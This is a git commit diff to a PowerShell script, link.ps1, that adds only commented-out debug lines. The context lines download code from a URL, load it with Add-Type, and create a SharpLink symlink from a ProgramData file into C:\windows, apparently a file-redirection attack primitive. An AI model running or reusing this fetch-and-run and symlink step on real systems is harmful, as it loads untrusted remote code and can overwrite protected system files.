847a1b152bc56401809fe4f04d9e7e6350b48ec7
valen <lastleaf404@gmail.com>
2022-08-01 21:13:21 +0630

    Update link.ps1

--- link.ps1
+++ link.ps1
@@ -3,4 +3,8 @@ $code = Invoke-WebRequest -Uri $url -UseBasicParsing;
 Add-Type $code
 $s = New-Object de.usd.SharpLink.Symlink("C:\ProgramData\test\1.txt", "C:\windows\target.txt")
 $s.Open()
+#$s.Status()
+#Write-Host "[-] test!!!" -ForegroundColor Red
+#Write-Host "[+] test $target2"
+#Start-Sleep -s 3
 $s.Close()
